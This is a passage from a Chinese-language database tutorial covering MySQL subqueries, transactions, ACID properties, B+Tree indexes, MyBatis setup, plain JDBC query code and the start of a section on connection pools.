<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例2：查询在 &quot;方东白&quot; 入职之后的员工信息</span></span><br><span class="line"><span class="comment">-- 可以将需求分解为两步：</span></span><br><span class="line"> <span class="comment">--  查询 方东白 的入职日期</span></span><br><span class="line"> <span class="comment">--  查询 指定入职日期之后入职的员工信息</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">-- 1.查询&quot;方东白&quot;的入职日期</span></span><br><span class="line"><span class="keyword">select</span> entrydate <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;方东白&#x27;</span>;     #查询结果：<span class="number">2012</span><span class="number">-11</span><span class="number">-01</span></span><br><span class="line"><span class="comment">-- 2.查询指定入职日期之后入职的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2012-11-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 合并以上两条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> (<span class="keyword">select</span> entrydate <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;方东白&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="列子查询"><a class="header-anchor" href="#列子查询">¶</a>列子查询</h5>
<ul>
<li>结果是一列(可以是多行)</li>
<li>常用操作符</li>
</ul>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>IN</td>
<td>在指定的集合范围之内，多选一</td>
</tr>
<tr>
<td>NOT IN</td>
<td>不在指定的集合范围之内</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例：查询&quot;教研部&quot;和&quot;咨询部&quot;的所有员工信息</span></span><br><span class="line"><span class="comment">-- 分解为以下两步：</span></span><br><span class="line">	<span class="comment">-- 查询 &quot;销售部&quot; 和 &quot;市场部&quot; 的部门ID</span></span><br><span class="line">	<span class="comment">-- 根据部门ID, 查询员工信息</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">-- 1.查询&quot;销售部&quot;和&quot;市场部&quot;的部门ID</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;咨询部&#x27;</span>;   <span class="comment">-- 查询结果：3,2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.根据部门ID, 查询员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="keyword">in</span> (<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 合并以上两条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="keyword">in</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tb_dept <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;教研部&#x27;</span> <span class="keyword">or</span> name <span class="operator">=</span> <span class="string">&#x27;咨询部&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="行子查询"><a class="header-anchor" href="#行子查询">¶</a>行子查询</h5>
<ul>
<li>结果是一行(可以是多列)</li>
<li>常用的操作符：<code>=</code> 、<code>&lt;&gt;</code> 、<code>IN </code>、<code>NOT IN</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例：查询与&quot;韦一笑&quot;的入职日期及职位都相同的员工信息 </span></span><br><span class="line"><span class="comment">-- 可以拆解为两步进行： </span></span><br><span class="line"><span class="comment">--	 查询 &quot;韦一笑&quot; 的入职日期 及 职位</span></span><br><span class="line"><span class="comment">--	 查询与&quot;韦一笑&quot;的入职日期及职位相同的员工信息 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询&quot;韦一笑&quot;的入职日期 及 职位</span></span><br><span class="line"><span class="keyword">select</span> entrydate , job <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;韦一笑&#x27;</span>;  #查询结果： <span class="number">2007</span><span class="number">-01</span><span class="number">-01</span> , <span class="number">2</span></span><br><span class="line"><span class="comment">-- 查询与&quot;韦一笑&quot;的入职日期及职位相同的员工信息</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> (entrydate,job) <span class="operator">=</span> (<span class="string">&#x27;2007-01-01&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 合并以上两条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> (entrydate,job) <span class="operator">=</span> (<span class="keyword">select</span> entrydate , job <span class="keyword">from</span> tb_emp <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;韦一笑&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="表子查询"><a class="header-anchor" href="#表子查询">¶</a>表子查询</h5>
<ul>
<li>结果是多行多列，常作为临时表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 案例：查询入职日期是 &quot;2006-01-01&quot; 之后的员工信息 , 及其部门信息</span></span><br><span class="line"><span class="comment">-- 分解为两步执行：</span></span><br><span class="line">	<span class="comment">-- 查询入职日期是 &quot;2006-01-01&quot; 之后的员工信息</span></span><br><span class="line">	<span class="comment">-- 基于查询到的员工信息，在查询对应的部门信息</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2006-01-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> e.<span class="operator">*</span>, d.<span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> entrydate <span class="operator">&gt;</span> <span class="string">&#x27;2006-01-01&#x27;</span>) e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.dept_id <span class="operator">=</span> d.id ;</span><br></pre></td></tr></table></figure>
<h3 id="事务"><a class="header-anchor" href="#事务">¶</a>事务</h3>
<ul>
<li>实际的业务开发中，有些业务操作要多次访问数据库。一个业务要发送多条SQL语句给数据库执行</li>
<li>需要将多次访问数据库的操作视为<strong>一个整体</strong>来执行</li>
<li>要么所有的SQL语句全部执行成功</li>
<li>如果其中有一条SQL语句失败，就进行事务的回滚，所有的SQL语句全部执行失败</li>
</ul>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>事务：一组操作的集合，是一个不可分割的工作单位</li>
<li>事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败</li>
</ul>
<h4 id="操作"><a class="header-anchor" href="#操作">¶</a>操作</h4>
<ul>
<li>
<p>MySQL的两种进行事务的方式</p>
<ul>
<li><code>自动提交事务</code>
<ul>
<li>即执行一条sql语句提交一次事务。（默认MySQL的事务是自动提交）</li>
</ul>
</li>
<li><code>手动提交事务</code>
<ul>
<li>先开启，再提交</li>
</ul>
</li>
</ul>
</li>
<li>
<p>事务操作有关的SQL语句</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>SQL语句</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>start transaction; / begin;</td>
<td>开启手动控制事务</td>
</tr>
<tr>
<td>commit;</td>
<td>提交事务</td>
</tr>
<tr>
<td>rollback;</td>
<td>回滚事务</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 开启事务</span></span><br><span class="line"><span class="keyword">start</span> transaction ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除学工部</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_dept <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除学工部的员工</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> dept_id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">-- 提交事务（成功时执行）</span></span><br><span class="line"><span class="keyword">commit</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 回滚事务（出错时执行）</span></span><br><span class="line"><span class="keyword">rollback</span> ;</span><br></pre></td></tr></table></figure>
<h4 id="事务的四大特性"><a class="header-anchor" href="#事务的四大特性">¶</a>事务的四大特性</h4>
<ul>
<li>原子性（Atomicity）
<ul>
<li>事务是不可分割的最小单元，要么全部成功，要么全部失败</li>
</ul>
</li>
<li>一致性（Consistency）
<ul>
<li>事务完成时，必须使所有的数据都保持一致状态</li>
</ul>
</li>
<li>隔离性（Isolation）
<ul>
<li>数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行</li>
</ul>
</li>
<li>持久性（Durability）
<ul>
<li>事务一旦提交或回滚，它对数据库中的数据的改变就是永久的</li>
</ul>
</li>
</ul>
<blockquote>
<p>事务的四大特性简称为：ACID</p>
</blockquote>
<h3 id="索引"><a class="header-anchor" href="#索引">¶</a>索引</h3>
<h4 id="介绍-v2"><a class="header-anchor" href="#介绍-v2">¶</a>介绍</h4>
<ul>
<li><code>索引(index)</code>
<ul>
<li>是帮助数据库高效获取数据的数据结构</li>
<li>使用索引可以提高查询的效率</li>
</ul>
</li>
</ul>
<h4 id="优点"><a class="header-anchor" href="#优点">¶</a>优点</h4>
<ul>
<li>提高数据查询的效率，降低数据库的IO成本</li>
<li>通过索引列对数据进行排序，降低数据排序的成本，降低CPU消耗</li>
</ul>
<h4 id="缺点"><a class="header-anchor" href="#缺点">¶</a>缺点</h4>
<ul>
<li>索引会占用存储空间</li>
<li>索引大大提高了查询效率，同时却也降低了insert、update、delete的效率</li>
</ul>
<h4 id="结构"><a class="header-anchor" href="#结构">¶</a>结构</h4>
<ul>
<li>MySQL数据库支持的索引结构有：
<ul>
<li><code>Hash索引</code>、<code>B+Tree索引</code>、<code>Full-Text索引</code>等</li>
<li>默认B+ Tree 结构组织的索引</li>
</ul>
</li>
</ul>
<h4 id="回归：树结构"><a class="header-anchor" href="#回归：树结构">¶</a>回归：树结构</h4>
<ul>
<li>
<p>二叉查找树</p>
<ul>
<li>左边的子节点比父节点小，右边的子节点比父节点大</li>
</ul>
</li>
<li>
<p>向二叉查找树保存数据时，是按照从大到小(或从小到大)的顺序保存的</p>
</li>
<li>
<p>此时形成一个单向链表，搜索性能打折扣</p>
<ul>
<li>可以选择平衡二叉树或者是红黑树来解决上述问题（红黑树也是一棵平衡的二叉树）</li>
</ul>
</li>
<li>
<p>但是Mysql没有用二叉搜索树或二叉平衡树或红黑树作为索引的结构</p>
<ul>
<li>最大的问题：数据量大的情况下，树的层级比较深，会影响检索速度</li>
<li>二叉搜索数还是红黑数，一个节点下面只能有两个子节点</li>
<li>在数据量大的情况下，就会造成树的高度比较高，树的高度高，检索速度就降低</li>
</ul>
</li>
<li>
<p>解决方案：</p>
<ul>
<li>减少红黑树的高度，增加树的宽度</li>
<li>引入另一种数据结构，一个节点可以保存多个数据</li>
<li>宽度增加，降低树的高度</li>
<li><strong><u>BTree</u></strong></li>
</ul>
</li>
</ul>
<h4 id="B-Tree-（多路平衡搜索树）"><a class="header-anchor" href="#B-Tree-（多路平衡搜索树）">¶</a>B+ Tree （多路平衡搜索树）</h4>
<ul>
<li>
<p>每一个节点，可以存储多个key（有n个key，就有n个指针）</p>
</li>
<li>
<p>节点分为：<code>叶子节点</code>、<code>非叶子节点</code></p>
<ul>
<li>
<p>叶子节点</p>
<blockquote>
<p>即最后一层子节点，所有的数据都存储在叶子节点上</p>
</blockquote>
</li>
<li>
<p>非叶子节点</p>
<blockquote>
<p>不是树结构最下面的节点，用于索引数据，存储的的是：key+指针</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>为了提高范围查询效率，叶子节点形成了一个<strong>双向链表</strong>，便于数据的排序及区间范围查询</p>
</li>
</ul>
<blockquote>
<p>B+Tree有如下优点：</p>
<ul>
<li>千万条数据，B+Tree可以控制在小于等于3的高度</li>
<li>所有的数据都存储在叶子节点上，并且底层已经实现了按照索引进行排序，还可以支持范围查询，叶子节点是一个双向链表，支持从小到大或者从大到小查找</li>
</ul>
</blockquote>
<h4 id="语法"><a class="header-anchor" href="#语法">¶</a>语法</h4>
<h5 id="创建索引"><a class="header-anchor" href="#创建索引">¶</a>创建索引</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span>  [ <span class="keyword">unique</span> ]  index 索引名 <span class="keyword">on</span>  表名 (字段名,... ) ;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：为tb_emp表的name字段建立一个索引</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_emp_name <span class="keyword">on</span> tb_emp(name);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在创建表时，如果添加了主键primary key和唯一约束unique</p>
<p>就会默认创建：主键索引、唯一约束</p>
</blockquote>
<h5 id="查看索引"><a class="header-anchor" href="#查看索引">¶</a>查看索引</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> index <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：查询 tb_emp 表的索引信息</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> index <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure>
<h5 id="删除索引"><a class="header-anchor" href="#删除索引">¶</a>删除索引</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index 索引名 <span class="keyword">on</span> 表名;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：删除 tb_emp 表中name字段的索引</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index idx_emp_name <span class="keyword">on</span> tb_emp;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意事项：</p>
<ul>
<li>主键字段，在建表时，会自动创建主键索引</li>
<li>添加唯一约束时，数据库实际上会添加唯一索引</li>
</ul>
</blockquote>
<h2 id="Mybatis入门"><a class="header-anchor" href="#Mybatis入门">¶</a>Mybatis入门</h2>
<ul>
<li>
<p>一款优秀的 <strong>持久层</strong> <strong>框架</strong>，用于简化JDBC的开发</p>
<ul>
<li>
<p>官网：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p>
</li>
<li>
<p><strong>持久层</strong></p>
<blockquote>
<p>数据访问层(dao)，是用来操作数据库</p>
</blockquote>
</li>
<li>
<p><strong>框架</strong></p>
<blockquote>
<p>半成品软件，是一套可重用的、通用的、软件基础代码模型。在框架的基础上进行软件开发更加高效、规范、通用、可拓展</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>Mybatis入门</strong></p>
</li>
<li>
<p><strong>Mybatis基础增删改查</strong></p>
</li>
<li>
<p><strong>Mybatis动态SQL</strong></p>
</li>
</ul>
<h3 id="Mybatis快速入门"><a class="header-anchor" href="#Mybatis快速入门">¶</a>Mybatis快速入门</h3>
<ul>
<li>在Mybatis中编写SQL查询代码，发送给数据库执行，数据库执行后返回结果</li>
<li>Mybatis会把数据库执行的查询结果，使用实体类封装起来（一行记录对应一个实体类对象）</li>
<li>Mybatis操作数据库的步骤：
<ol>
<li><code>准备工作(创建springboot工程、数据库表user、实体类User)</code></li>
<li><code>引入Mybatis的相关依赖，配置Mybatis(数据库连接信息)</code></li>
<li><code>编写SQL语句(注解/XML)</code></li>
</ol>
</li>
</ul>
<h4 id="配置Mybatis"><a class="header-anchor" href="#配置Mybatis">¶</a>配置Mybatis</h4>
<blockquote>
<p>连接数据库的四大参数：</p>
<ul>
<li>MySQL驱动类</li>
<li>登录名</li>
<li>密码</li>
<li>数据库连接字符串</li>
</ul>
</blockquote>
<ul>
<li>在<code>springboot</code>项目中，可以编写<code>application.properties</code>文件，配置数据库连接信息</li>
<li>连接数据库，就要配置数据库连接的基本信息，包括：<code>driver-class-name</code>、<code>url </code>、<code>username</code>，<code>password</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># application.properties</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#驱动类名称</span><br><span class="line">spring.datasource.driver<span class="operator">-</span>class<span class="operator">-</span>name <span class="operator">=</span> com.mysql.cj.jdbc.Driver</span><br><span class="line">#数据库连接的url</span><br><span class="line">spring.datasource.url <span class="operator">=</span> jdbc:mysql:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">3306</span><span class="operator">/</span>mybatis</span><br><span class="line">#连接数据库的用户名</span><br><span class="line">spring.datasource.username <span class="operator">=</span> root</span><br><span class="line">#连接数据库的密码</span><br><span class="line">spring.datasource.password <span class="operator">=</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="编写SQL语句"><a class="header-anchor" href="#编写SQL语句">¶</a>编写SQL语句</h4>
<ul>
<li>在引导类所在包下，在创建一个包 <code>mapper</code></li>
<li>在<code>mapper</code>包下创建一个接口 <code>UserMapper </code>，这是一个持久层接口（<code>Mybatis</code>的持久层接口规范一般都叫 <code>XxxMapper</code>）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UserMapper.java</span></span><br><span class="line"><span class="keyword">package</span> com.example.sprintbootmybatisquickstart.mapper;</span><br><span class="line"><span class="keyword">import</span> com.example.sprintbootmybatisquickstart.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="comment">//查询所有用户数据</span></span><br><span class="line">    <span class="meta">@Select(&quot;select id, name, age, gender, phone from user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">list</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>@Mapper注解：表示是mybatis中的Mapper接口</p>
<ul>
<li>程序运行时：框架会自动生成接口的实现类对象(代理对象)，并给交Spring的IOC容器管理</li>
</ul>
<p>@Select注解：代表的就是select查询，用于书写select查询语句</p>
</blockquote>
<h4 id="单元测试"><a class="header-anchor" href="#单元测试">¶</a>单元测试</h4>
<ul>
<li>在创建出来的<code>SpringBoot</code>工程中，在<code>src</code>下的<code>test</code>目录下，已经自动创建了<code>测试类 </code></li>
<li>并且在测试类上已经添加了注解 <code>@SpringBootTest</code>，代表该测试类已经与<code>SpringBoot</code>整合</li>
<li>测试类在运行时，会自动通过引导类加载<code>Spring</code>的环境（<code>IOC</code>容器）</li>
<li>测试<code>bean</code>对象，可直接通过<code>@Autowired</code>注解直接将其注入进行，然后测试</li>
</ul>
<h4 id="解决SQL警告与提示"><a class="header-anchor" href="#解决SQL警告与提示">¶</a>解决SQL警告与提示</h4>
<ul>
<li>默认在<code>UserMapper</code>接口上的<code>@Select</code>注解中编写<code>SQL</code>语句是没有提示的</li>
<li>想让<code>idea</code>给出提示：
<ul>
<li>选中<code>@Select(&quot;xxx&quot;) </code>即括号中的<code>SQL</code>语句内容</li>
<li>右键→<code>Show Context Actions</code></li>
<li><code>Inject language or reference</code></li>
<li>选择<code>MySQL（SQL）</code></li>
</ul>
</li>
</ul>
<h3 id="JDBC介绍（了解即可）"><a class="header-anchor" href="#JDBC介绍（了解即可）">¶</a>JDBC介绍（了解即可）</h3>
<ul>
<li>
<p><code>Mybatis</code>框架：对原始的<code>JDBC</code>程序的封装</p>
</li>
<li>
<p><code>JDBC： ( Java DataBase Connectivity )</code>，就是使用<code>Java</code>语言操作关系型数据库的一套<code>API</code></p>
<blockquote>
<p>本质：</p>
<p>sun公司官方定义的一套操作所有关系型数据库的规范，即接口</p>
<p>各个数据库厂商去实现这套接口，提供数据库驱动jar包</p>
<p>使用这套接口(JDBC)编程，真正执行的是驱动jar包中的实现类</p>
</blockquote>
</li>
</ul>
<h4 id="代码"><a class="header-anchor" href="#代码">¶</a>代码</h4>
<ul>
<li>操作步骤：
<ol>
<li>注册驱动</li>
<li>获取连接对象</li>
<li>执行SQL语句，返回执行结果</li>
<li>处理执行结果</li>
<li>释放资源</li>
</ol>
</li>
</ul>
<blockquote>
<p>在pom.xml文件中已引入MySQL驱动依赖，直接编写JDBC代码即可</p>
</blockquote>
<ul>
<li>JDBC具体实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.itheima.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJdbc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1. 注册驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 获取数据库连接</span></span><br><span class="line">        String url=<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 执行SQL</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(); <span class="comment">//操作SQL的对象</span></span><br><span class="line">        String sql=<span class="string">&quot;select id,name,age,gender,phone from user&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);<span class="comment">//SQL查询结果会封装在ResultSet对象中</span></span><br><span class="line"></span><br><span class="line">        List&lt;User&gt; userList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();<span class="comment">//集合对象（用于存储User对象）</span></span><br><span class="line">        <span class="comment">//4. 处理SQL执行结果</span></span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            <span class="comment">//取出一行记录中id、name、age、gender、phone下的数据</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">short</span> <span class="variable">age</span> <span class="operator">=</span> rs.getShort(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">            <span class="type">short</span> <span class="variable">gender</span> <span class="operator">=</span> rs.getShort(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;phone&quot;</span>);</span><br><span class="line">            <span class="comment">//把一行记录中的数据，封装到User对象中</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(id,name,age,gender,phone);</span><br><span class="line">            userList.add(user);<span class="comment">//User对象添加到集合</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//5. 释放资源</span></span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">        rs.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历集合</span></span><br><span class="line">        <span class="keyword">for</span> (User user : userList) &#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="JDBC的问题分析"><a class="header-anchor" href="#JDBC的问题分析">¶</a>JDBC的问题分析</h4>
<ul>
<li>数据库链接的四要素(驱动、链接、用户名、密码)全部硬编码在java代码中</li>
<li>查询结果的解析及封装非常繁琐</li>
<li>每一次查询数据库都需要获取连接,操作完毕后释放连接, 资源浪费, 性能降低</li>
</ul>
<h4 id="技术对比"><a class="header-anchor" href="#技术对比">¶</a>技术对比</h4>
<ul>
<li>在mybatis中解决JDBC的问题：
<ul>
<li>数据库连接四要素(驱动、链接、用户名、密码)，都配置在springboot默认的配置文件 application.properties中</li>
<li>查询结果的解析及封装，由mybatis自动完成映射封装，我们无需关注</li>
<li>在mybatis中使用了数据库连接池技术，从而避免了频繁的创建连接、销毁连接而带来的资源浪费</li>
</ul>
</li>
</ul>
<h4 id="Mybatis需要关注的地方"><a class="header-anchor" href="#Mybatis需要关注的地方">¶</a>Mybatis需要关注的地方</h4>
<ol>
<li><code>application.properties</code></li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#驱动类名称</span><br><span class="line">spring.datasource.driver<span class="operator">-</span>class<span class="operator">-</span>name<span class="operator">=</span>com.mysql.cj.jdbc.Driver</span><br><span class="line">#数据库连接的url</span><br><span class="line">spring.datasource.url<span class="operator">=</span>jdbc:mysql:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">3306</span><span class="operator">/</span>mybatis</span><br><span class="line">#连接数据库的用户名</span><br><span class="line">spring.datasource.username<span class="operator">=</span>root</span><br><span class="line">#连接数据库的密码</span><br><span class="line">spring.datasource.password<span class="operator">=</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>Mapper接口（编写SQL语句）</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="variable">@Mapper</span></span><br><span class="line">public interface UserMapper &#123;</span><br><span class="line">    <span class="variable">@Select</span>(&quot;select id, name, age, gender, phone from user&quot;)</span><br><span class="line">    public List<span class="operator">&lt;</span><span class="keyword">User</span><span class="operator">&gt;</span> list();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据库连接池"><a class="header-anchor" href="#数据库连接池">¶</a>数据库连接池</h3>
<ul>
<li>避免频繁的创建连接、销毁连接而带来的资源浪费</li>
</ul>
<h4 id="介绍-v3"><a class="header-anchor" href="#介绍-v3">¶</a>介绍</h4>
<ul>
<li>
<p>没有使用数据库连接池：</p>
<blockquote>
<p>客户端执行SQL语句：</p>
<p>要先创建一个新的连接对象，然后执行SQL语句</p>
<p>SQL语句执行后又需要关闭连接对象从而释放资源</p>
<p>每次执行SQL时都需要创建连接、销毁链接</p>
<p>这种频繁的重复创建销毁的过程是比较耗费计算机的性能。</p>
</blockquote>
</li>
<li>
<p>数据库连接池是个容器，负责分配、管理数据库连接<code>(Connection)</code></p>
<ul>
<li>程序在启动时，会在数据库连接池(容器)中，<strong>创建一定数量的Connection对象</strong></li>
<li>允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</li>
</ul>
</li>
<li>
<p>客户端在执行SQL时，先从连接池中获取一个Connection对象，然后再执行SQL语句</p>
<ul>
<li>SQL语句执行完之后，释放Connection时就会把Connection对象归还给连接池（Connection对象可以复用）</li>
<li>释放<strong>空闲时间</strong>超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏</li>
</ul>
</li>
<li>
<p>客户端获取到Connection对象了，但是Connection对象并没有去访问数据库(处于空闲)</p>
<ul>
<li>数据库连接池发现Connection对象的空闲时间 &gt; 连接池中预设的最大空闲时间</li>
<li>此时数据库连接池就会自动释放掉这个连接对象</li>
</ul>
</li>
</ul>
<h4 id="数据库连接池的好处"><a class="header-anchor" href="#数据库连接池的好处">¶</a>数据库连接池的好处</h4>
<ul>
<li>资源重用</li>
<li>提升系统响应速度</li>
<li>避免数据库连接遗漏</li>
</ul>
<h4 id="产品"><a class="header-anchor" href="#产品">¶</a>产品</h4>
<ul>
<li>
<p>官方(sun)提供了数据库连接池标准（javax.sql.DataSource接口）</p>
<ul>
<li>功能：获取连接</li>
</ul>
